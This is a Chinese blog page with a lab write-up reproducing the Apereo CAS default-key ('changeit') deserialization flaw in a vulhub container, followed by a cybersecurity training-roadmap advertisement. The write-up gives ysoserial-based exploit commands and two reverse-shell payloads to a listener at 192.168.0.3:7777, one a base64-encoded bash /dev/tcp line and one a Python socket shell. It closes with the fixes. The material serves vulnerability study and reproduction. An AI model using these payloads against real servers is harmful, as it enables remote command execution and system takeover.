<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Apereo cas 密钥硬编码反序列化漏洞 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Apereo cas 密钥硬编码反序列化漏洞" />
<meta property="og:description" content="前言 最近也是在工作中遇到这个漏洞，之前没接触过，而且这个漏洞也比较老了，是2016年发现的，并且是基于反序列化产生的，所以就打算学习并且做一下复现，如果以后再遇到的时候能够知道该如何分析。
0x01 Apereo cas简介 Apereo CAS 单点登陆系统是Java服务器环境下使用较为广泛的单点登陆系统。
CAS 全程Central Authentication Service（中心认证服务），是一个单点登录协议，Apereo CAS是实现该协议的软件包。
单点登录定义
单点登录(Single sign
on)，英文名称缩写SSO，SSO的意思就是在多系统的环境中，登录单方系统，就可以在不用再次登录的情况下访问相关受信任的系统，也就是说只要登录一次单体系统就可以。
0x02 漏洞简介 最早发现此漏洞的文章：https://apereo.github.io/2016/04/08/commonsvulndisc/
漏洞成因是在4.1.7版本以前一直存在一个默认密钥问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，从而执行任意命令。
Apereo CAS 4.1.X~4.1.6 默认密钥
Apereo CAS 4.1.7~4.2.X KEY随机生成
0x03漏洞利用与复现 Webflow中使用了默认密钥changeit，所以我们就可以利用默认密钥生成序列化对象。
环境：安装了vulhub的kali
工具：apereo-cas-attack、burpsuite
Apereo-cas-attaack：使用ysoserial的CommonsCollections4生成加密后的Payload
启动vulhub中的Apereo cas环境 cd /vulhub/apereo-cas/4.1-rce
docker-compose up -d //启动docker环境
使用工具生成payload java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 “touch
/tmp/sucess”
进入主页并抓包，替换execution http://192.168.0.112:8080/cas/login
进入容器，在/tmp目录创建了success文件，说明成功利用 docker exec -it &lt;容器ID&gt; /bin/bash
docker ps -a //查找容器ID，一串字符串的就是ID
其他利用方式 ①反弹shell，bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1，payload如下
​
java -jar apereo-cas-attack-1." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/61067809b7db15152a329d51e24e6d4b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-12T15:17:18+08:00" />
<meta property="article:modified_time" content="2023-01-12T15:17:18+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Apereo cas 密钥硬编码反序列化漏洞</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="_0"></a>前言</h3> 
<p>最近也是在工作中遇到这个漏洞，之前没接触过，而且这个漏洞也比较老了，是2016年发现的，并且是基于反序列化产生的，所以就打算学习并且做一下复现，如果以后再遇到的时候能够知道该如何分析。</p> 
<h3><a id="0x01_Apereo_cas_4"></a>0x01 Apereo cas简介</h3> 
<p>Apereo CAS 单点登陆系统是Java服务器环境下使用较为广泛的单点登陆系统。</p> 
<p>CAS 全程Central Authentication Service（中心认证服务），是一个单点登录协议，Apereo CAS是实现该协议的软件包。</p> 
<p>单点登录定义</p> 
<p>单点登录(Single sign<br> on)，英文名称缩写SSO，SSO的意思就是在多系统的环境中，登录单方系统，就可以在不用再次登录的情况下访问相关受信任的系统，也就是说只要登录一次单体系统就可以。</p> 
<h3><a id="0x02__15"></a>0x02 漏洞简介</h3> 
<p>最早发现此漏洞的文章：<a href="https://apereo.github.io/2016/04/08/commonsvulndisc/" rel="nofollow">https://apereo.github.io/2016/04/08/commonsvulndisc/</a></p> 
<p>漏洞成因是在4.1.7版本以前一直存在一个默认密钥问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，从而执行任意命令。</p> 
<p>Apereo CAS 4.1.X~4.1.6 默认密钥</p> 
<p>Apereo CAS 4.1.7~4.2.X KEY随机生成</p> 
<h3><a id="0x03_25"></a>0x03漏洞利用与复现</h3> 
<p>Webflow中使用了默认密钥changeit，所以我们就可以利用默认密钥生成序列化对象。</p> 
<p><img src="https://images2.imgbox.com/7b/30/1cYYmZOe_o.jpg" alt="1668417960_637209a8c4888b8abf57b.png!small"></p> 
<p>环境：安装了vulhub的kali</p> 
<p>工具：apereo-cas-attack、burpsuite</p> 
<p>Apereo-cas-attaack：使用ysoserial的CommonsCollections4生成加密后的Payload</p> 
<h4><a id="vulhubApereo_cas_37"></a>启动vulhub中的Apereo cas环境</h4> 
<p>cd /vulhub/apereo-cas/4.1-rce</p> 
<p>docker-compose up -d //启动docker环境</p> 
<p><img src="https://images2.imgbox.com/43/0e/XkrCQySR_o.jpg" alt="1668417075_637206331bd976aa735c1.png!small"></p> 
<h4><a id="payload_45"></a>使用工具生成payload</h4> 
<p>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 “touch<br> /tmp/sucess”</p> 
<p><img src="https://images2.imgbox.com/d9/57/1X6cHVt0_o.jpg" alt="1668417087_6372063f1e35cac638ca1.png!small"></p> 
<h4><a id="execution_52"></a>进入主页并抓包，替换execution</h4> 
<p>http://192.168.0.112:8080/cas/login</p> 
<p><img src="https://images2.imgbox.com/ea/c0/EYvOqBPy_o.jpg" alt="1668417101_6372064dd2e01683805e9.png!small"></p> 
<p><img src="https://images2.imgbox.com/63/da/jT8MgstS_o.jpg" alt="1668417227_637206cbec8a2216215f6.png!small"></p> 
<h4><a id="tmpsuccess_60"></a>进入容器，在/tmp目录创建了success文件，说明成功利用</h4> 
<p>docker exec -it &lt;容器ID&gt; /bin/bash</p> 
<p>docker ps -a //查找容器ID，一串字符串的就是ID</p> 
<p><img src="https://images2.imgbox.com/13/61/QB2B888E_o.jpg" alt="1668417238_637206d61eafe3e1176b9.png!small"></p> 
<h4><a id="_68"></a>其他利用方式</h4> 
<p>①反弹shell，bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1，payload如下</p> 
<p>​</p> 
<pre><code>java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c  {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMy83Nzc3IDA+JjE=} | {base64,-d} | {bash,-i}"
</code></pre> 
<p><img src="https://images2.imgbox.com/61/47/SYERkI7V_o.jpg" alt="1668418301_63720afdd2ea23f67e516.png!small"></p> 
<p><img src="https://images2.imgbox.com/09/a7/T4mj6IbF_o.jpg" alt="1668418334_63720b1ed065e723d1918.png!small"></p> 
<p><img src="https://images2.imgbox.com/97/75/ThvjNBsI_o.jpg" alt="1668418348_63720b2c1572b994e9f72.png!small"></p> 
<p>python生成的payload如下，然后直接替换execution后即可反弹成功：</p> 
<p>​</p> 
<pre><code>python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.3',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);
</code></pre> 
<p>②回显与检测</p> 
<p>目的：网站所在系统环境无法出网，回显可以直接看到命令执行的返回内容。</p> 
<p>使用魔改工具ysoserial-mangguogan-<br> master，Payload如下，然后将编码后的数据替换execution，并且在请求头中添加cmd：whoami等命令，查看回显。</p> 
<p>​</p> 
<pre><code>java -jar ysoserial-managguogan-0.0.1-SNAPSHOT-all.jar encode CommonsCollections4
</code></pre> 
<p><img src="https://images2.imgbox.com/64/f6/wBeYX9KC_o.jpg" alt="1668417483_637207cb7ac9614cac5a8.png!small"></p> 
<p><img src="https://images2.imgbox.com/ca/b7/6zgbOC40_o.jpg" alt="1668417489_637207d1e3f928750678a.png!small"></p> 
<p>参考： 反弹shell <a href="https://www.cnblogs.com/Qixiansheng/p/15474651.html" rel="nofollow">https://www.cnblogs.com/Qixiansheng/p/15474651.html</a></p> 
<p>回显与检测 <a href="https://xz.aliyun.com/t/8260?page=5" rel="nofollow">https://xz.aliyun.com/t/8260?page=5</a></p> 
<p>附：kali的vulhub搭建</p> 
<p><a href="https://www.cnblogs.com/lxfweb/p/12952490.html" rel="nofollow">https://www.cnblogs.com/lxfweb/p/12952490.html</a></p> 
<h3><a id="0x04_117"></a>0x04漏洞危害</h3> 
<p>任意命令执行</p> 
<h3><a id="0x05_121"></a>0x05漏洞修复</h3> 
<blockquote> 
 <p>修改默认密钥</p> 
 <p>升级Apereo CAS版本</p> 
</blockquote> 
<p>注意：漏洞利用成功响应头回显是500，并且响应体中会有正常的数据。</p> 
<p><img src="https://images2.imgbox.com/43/7f/emElevOw_o.jpg" alt="1668417533_637207fd6deacf72f1d4c.png!small"></p> 
<h3><a id="_130"></a>最后</h3> 
<h2><a id="_131"></a>网络安全学习路线（就业版）</h2> 
<p>再次声明，此学习路线主打就业方向，如果只是感兴趣，想成为什么黑客的朋友可以划走了！</p> 
<p><strong>网络安全≠黑客</strong></p> 
<p>很多人上来就说想做想入行网络安全，但是连方向都没搞清楚就开始学习，最终也只是会无疾而终！黑客是一个大的概念，里面包含了许多方向，不同的方向需要学习的内容也不一样。</p> 
<p>网络安全再进一步细分，还可以划分为：<strong>网络渗透、逆向分析、漏洞攻击、内核安全、移动安全、破解PWN</strong>等众多子方向。今天的这篇，主要是针对网络渗透方向，其他方向仅供参考，学习路线并不完全一样，有机会的话我再单独梳理。</p> 
<p>今天，就为大家整理一份自己自学网络安全企业级的最主流的职业规划路线学习流程：</p> 
<p>学前感言</p> 
<ul><li>1.这是一条坚持的道路,三分钟的热情可以放弃往下看了.</li><li>2.多练多想,不要离开了教程什么都不会了.最好看完教程自己独立完成技术方面的开发.</li><li>3.有时多google,baidu,我们往往都遇不到好心的大神,谁会无聊天天给你做解答.</li><li>4.遇到实在搞不懂的,可以先放放,以后再来解决</li></ul> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm1001201430015502_151"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>第一步：明确的学习路线</h4> 
<p>你肯定需要一份完整的知识架构体系图。</p> 
<blockquote> 
 <p>如图片过大被平台压缩导致模糊，可以在文末下载高清无水印版</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/54/7d/PZdassTx_o.png" alt="img"></p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm1001201430015502_159"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>第二步：阶段性的学习目标&amp;规划</h4> 
<p><img src="https://images2.imgbox.com/eb/45/MQxaVniG_o.png" alt="img"></p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm1001201430015502_163"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>企业级：初级网络安全工程师</h4> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm100120143001550212_165"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>1、网络安全理论知识（2天）</h4> 
<p>①了解行业相关背景，前景，确定发展方向。</p> 
<p>②学习网络安全相关法律法规。</p> 
<p>③网络安全运营的概念。</p> 
<p>④等保简介、等保规定、流程和规范。<strong>（非常重要）</strong></p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm10012014300155022_175"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>2、渗透测试基础（一周）</h4> 
<p>①渗透测试的流程、分类、标准</p> 
<p>②信息收集技术：主动/被动信息搜集、Nmap工具、Google Hacking</p> 
<p>③漏洞扫描、漏洞利用、原理，利用方法、工具（MSF）、绕过IDS和反病毒侦察</p> 
<p>④主机攻防演练：MS17-010、MS08-067、MS10-046、MS12-20等</p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm10012014300155023_185"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>3、操作系统基础（一周）</h4> 
<p>①Windows系统常见功能和命令</p> 
<p>②Kali Linux系统常见功能和命令</p> 
<p>③操作系统安全（系统入侵排查/系统加固基础）</p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm10012014300155024_193"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>4、计算机网络基础（一周）</h4> 
<p>①计算机网络基础、协议和架构</p> 
<p>②网络通信原理、OSI模型、数据 转发流程</p> 
<p>③常见协议解析（HTTP、TCP/IP、ARP等）</p> 
<p>④网络攻击技术与网络安全防御技术</p> 
<p>⑤Web漏洞原理与防御：主动/被动攻击、DDOS攻击、CVE漏洞复现</p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm100120143001550252_205"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>5、数据库基础操作（2天）</h4> 
<p>①数据库基础</p> 
<p>②SQL语言基础</p> 
<p>③数据库安全加固</p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm10012014300155026Web1_213"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>6、Web渗透（1周）</h4> 
<p>①HTML、CSS和JavaScript简介 ②OWASP Top10 ③Web漏洞扫描工具 ④Web渗透工具：Nmap、BurpSuite、SQLMap、其他（菜刀、漏扫等）</p> 
<p><img src="https://images2.imgbox.com/f0/76/1vxwqhVD_o.png" alt="img"></p> 
<blockquote> 
 <p>以上学习路线附全套教程由我个人支付上万元在培训机构付费购买，如有朋友需要<a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY2MzU2MQ==&amp;mid=2247487252&amp;idx=1&amp;sn=5204f695bb81a477d2eb10d71e9261e2&amp;chksm=cf110df2f86684e4a52b8564207bf97aa5fef3cfd357a0252ca42a0aa83e2e7902fa6a43878e&amp;token=234848407&amp;lang=zh_CN#rd" rel="nofollow"><strong>点击这里</strong></a>免费获取，无偿分享！</p> 
</blockquote> 
<p><strong>一些我收集的网络安全自学入门书籍</strong></p> 
<p><img src="https://images2.imgbox.com/d2/21/5PCrsloO_o.png" alt="img"></p> 
<p><strong>一些我自己买的、其他平台白嫖不到的视频教程：</strong></p> 
<p><img src="https://images2.imgbox.com/ce/57/BzCxxT0e_o.png" alt="在这里插入图片描述"></p> 
<p>如果学到这里，你基本可以从事一份网络安全相关的工作，比如渗透测试、Web 渗透、安全服务、安全分析等岗位；如果等保模块学的好，还可以从事等保工程师。<strong>薪资区间6k-15k。</strong></p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm1001201430015502_233"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>进阶：脚本编程（初级/中级/高级）</h4> 
<p>在网络安全领域。<strong>是否具备编程能力是“脚本小子”和真正黑客的本质区别</strong>。在实际的渗透测试过程中，面对复杂多变的网络环境，当常用工具不能满足实际需求的时候，往往需要对现有工具进行扩展，或者编写符合我们要求的工具、自动化脚本，这个时候就需要具备一定的编程能力。在分秒必争的CTF竞赛中，想要高效地使用自制的脚本工具来实现各种目的，更是需要拥有编程能力。</p> 
<p>零基础入门，建议选择脚本语言Python/PHP/Go/Java中的一种，对常用库进行编程学习； 搭建开发环境和选择IDE,PHP环境推荐Wamp和XAMPP， IDE强烈推荐Sublime； ·Python编程学习，学习内容包含：语法、正则、文件、 网络、多线程等常用库，推荐《Python核心编程》，不要看完； ·用Python编写漏洞的exp,然后写一个简单的网络爬虫； ·PHP基本语法学习并书写一个简单的博客系统； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架 (可选)； ·了解Bootstrap的布局或者CSS。</p> 
<h4><a id="httpsblogcsdnnetButton12138articledetails128651440spm1001201430015502_239"></a><a href="https://blog.csdn.net/Button12138/article/details/128651440?spm=1001.2014.3001.5502"></a>高级网络安全工程师</h4> 
<p>这部分内容对零基础的同学来说还比较遥远，就不展开细说了，贴一个大概的路线。感兴趣的童鞋可以研究一下。<br> <img src="https://images2.imgbox.com/ed/e7/VD1lQSGD_o.png" alt="img"></p> 
<p><img src="https://images2.imgbox.com/b7/19/MKIrUO4c_o.jpg" alt="img"><br> <strong>以上学习路线附全套教程由我个人支付上万元在培训机构付费购买</strong>，如有朋友需要<a href="https://mp.weixin.qq.com/s?__biz=Mzg3ODY2MzU2MQ==&amp;mid=2247487252&amp;idx=1&amp;sn=5204f695bb81a477d2eb10d71e9261e2&amp;chksm=cf110df2f86684e4a52b8564207bf97aa5fef3cfd357a0252ca42a0aa83e2e7902fa6a43878e&amp;token=234848407&amp;lang=zh_CN#rd" rel="nofollow"><strong>点击这里</strong></a><strong>免费获取，无偿分享！</strong></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/15cab0676ae06be6e9134bfec86b8f2d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">时间序列预测中使用类EMD方法时的信息泄露和计算量问题</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/896fa45bd7dca79a7eed978c9d5bd0e1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">将列表列表转换为具有多种数据类型的numpy数组</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>